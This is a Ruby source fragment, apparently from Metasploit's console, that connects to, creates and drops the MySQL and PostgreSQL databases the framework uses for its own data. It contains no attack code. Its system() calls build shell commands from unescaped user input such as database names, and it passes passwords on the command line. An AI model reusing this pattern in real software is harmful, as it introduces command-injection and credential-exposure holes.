			if (info[:user])
				opts['username'] = info[:user]
				argv.push('-u')
				argv.push(info[:user])
			end

			if (info[:pass])
				argv.push('--password=' + info[:pass])
				opts['password'] = info[:pass]
			end

			if (info[:host])
				opts['host'] = info[:host]
				argv.push('-h')
				argv.push(info[:host])
			end

			if (info[:port])
				opts['port'] = info[:port]
				argv.push('-P')
				argv.push(info[:port])

				# This is an ugly hack for a broken MySQL adapter:
				# 	http://dev.rubyonrails.org/ticket/3338
				if (opts['host'].strip.downcase == 'localhost')
					opts['host'] = Socket.gethostbyname("localhost")[3].unpack("C*").join(".")
				end
			end

			argv.push('-f')

			opts['database'] = info[:name]

			cargs = argv.map{|c| "'#{c}' "}.join

			system("mysqladmin #{cargs} drop #{info[:name]} >/dev/null 2>&1")
			system("mysqladmin #{cargs} create #{info[:name]}")

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end

			print_status("Database creation complete (check for errors)")
		end

		#
		# Drop an existing database
		#
		def db_destroy_mysql(*args)

			cmd_db_disconnect()

			return if ! db_find_tools(%W{mysqladmin})

			info = db_parse_db_uri_mysql(args[0])
			argv = []

			if (info[:user])
				argv.push('-u')
				argv.push(info[:user])
			end

			if (info[:pass])
				argv.push('--password=' + info[:pass])
			end

			if (info[:host])
				argv.push('-h')
				argv.push(info[:host])
			end

			if (info[:port])
				argv.push('-P')
				argv.push(info[:port])
			end

			argv.push("-f")

			cargs = argv.map{|c| "'#{c}' "}.join
			system("mysqladmin -f #{cargs} drop #{info[:name]}")
		end

		def db_parse_db_uri_mysql(path)
			res = {}
			if (path)
				auth, dest = path.split('@')
				(dest = auth and auth = nil) if not dest
				res[:user],res[:pass] = auth.split(':') if auth
				targ,name = dest.split('/')
				(name = targ and targ = nil) if not name
				res[:host],res[:port] = targ.split(':') if targ
			end
			res[:name] = name || 'metasploit3'
			res
		end

		#
		# Database management: Postgres
		#
		#
		# Disconnect from the current Postgres instance
		#
		def db_disconnect_postgresql(*args)
			if (framework.db)
				framework.db.disconnect()
			end
		end

		#
		# Connect to an existing Postgres database
		#
		def db_connect_postgresql(*args)
			if(args[0] == nil or args[0] == "-h" or args[0] == "--help")
				print_status("   Usage: db_connect <user:pass>@<host:port>/<database>")
				print_status("Examples:")
				print_status("       db_connect user@metasploit3")
				print_status("       db_connect user:pass@192.168.0.2/metasploit3")
				print_status("       db_connect user:pass@192.168.0.2:1500/metasploit3")
				return
			end

			info = db_parse_db_uri_postgresql(args[0])
			opts = { 'adapter' => 'postgresql' }

			opts['username'] = info[:user] if (info[:user])
			opts['password'] = info[:pass] if (info[:pass])
			opts['database'] = info[:name]
			opts['host'] = info[:host] if (info[:host])
			opts['port'] = info[:port] if (info[:port])

			opts['pass'] ||= ''

			# Do a little legwork to find the real database socket
			if(! opts['host'])
				while(true)
					done = false
					dirs = %W{ /var/run/postgresql /tmp }
					dirs.each do |dir|
						if(::File.directory?(dir))
							d = ::Dir.new(dir)
							d.entries.grep(/^\.s\.PGSQL.(\d+)$/).each do |ent|
								opts['port'] = ent.split('.')[-1].to_i
								opts['host'] = dir
								done = true
								break
							end
						end
						break if done
					end
					break
				end
			end

			# Default to loopback
			if(! opts['host'])
				opts['host'] = '127.0.0.1'
			end

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end
		end

		#
		# Create a new Postgres database instance
		#
		def db_create_postgresql(*args)
			cmd_db_disconnect()

			if(args[0] == nil or args[0] == "-h" or args[0] == "--help")
				print_status("   Usage: db_create <user:pass>@<host:port>/<database>")
				print_status("Examples:")
				print_status("       db_create user@metasploit3")
				print_status("       db_create user:pass@192.168.0.2/metasploit3")
				print_status("       db_create user:pass@192.168.0.2:1500/metasploit3")
				return
			end

			return if ! db_find_tools(%W{psql dropdb createdb})

			info = db_parse_db_uri_postgresql(args[0])
			opts = { 'adapter' => 'postgresql' }
			argv = []

			if (info[:user])
				opts['username'] = info[:user]
				argv.push('-U')
				argv.push(info[:user])
			else
				opts['username'] = 'postgres'
				argv.push('-U')
				argv.push('postgres')
			end

			if (info[:pass])
				print()
				print_status("Warning: You will need to enter the password at the prompts below")
				print()
				argv.push('-W')
			end

			if (info[:host])
				opts['host'] = info[:host]
				argv.push('-h')
				argv.push(info[:host])
			end

			if (info[:port])
				opts['port'] = info[:port]
				argv.push('-p')
				argv.push(info[:port])
			end

			opts['database'] = info[:name]

			cargs = argv.map{|c| "'#{c}' "}.join

			system("dropdb #{cargs} #{info[:name]} >/dev/null 2>&1")
			system("createdb #{cargs} #{info[:name]}")

			opts['password'] = info[:pass] || ''

			# Do a little legwork to find the real database socket
			if(! opts['host'])
				while(true)
					done = false
					dirs = %W{ /var/run/postgresql /tmp }
					dirs.each do |dir|
						if(::File.directory?(dir))
							d = ::Dir.new(dir)
							d.entries.grep(/^\.s\.PGSQL.(\d+)$/).each do |ent|
								opts['port'] = ent.split('.')[-1].to_i
								opts['host'] = dir
								done = true
								break
							end
						end
						break if done
					end
					break
				end
			end

			# Default to loopback
			if(! opts['host'])
				opts['host'] = '127.0.0.1'
			end

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end

			print_status("Database creation complete (check for errors)")
		end

		#
		# Drop an existing database
		#
		def db_destroy_postgresql(*args)

			cmd_db_disconnect()

			return if ! db_find_tools(%W{dropdb})

			info = db_parse_db_uri_postgresql(args[0])
			argv = []

			if (info[:user])
				argv.push('-U')
				argv.push(info[:user])
			end

			if (info[:pass])
				print()
				print_status("Warning: You will need to enter the password at the prompts below")
				print()
				argv.push('-W')
			end

			if (info[:host])
				argv.push('-h')
				argv.push(info[:host])
			end

			if (info[:port])
				argv.push('-p')
				argv.push(info[:port])
			end

			cargs = argv.map{|c| "'#{c}' "}.join
			system("dropdb #{cargs} #{info[:name]}")
		end

		def db_parse_db_uri_postgresql(path)
			res = {}
			if (path)
				auth, dest = path.split('@')
				(dest = auth and auth = nil) if not dest
				res[:user],res[:pass] = auth.split(':') if auth
				targ,name = dest.split('/')
				(name = targ and targ = nil) if not name
				res[:host],res[:port] = targ.split(':') if targ
			end
			res[:name] = name || 'metasploit3'
			res
		end

end
end
end
end
end

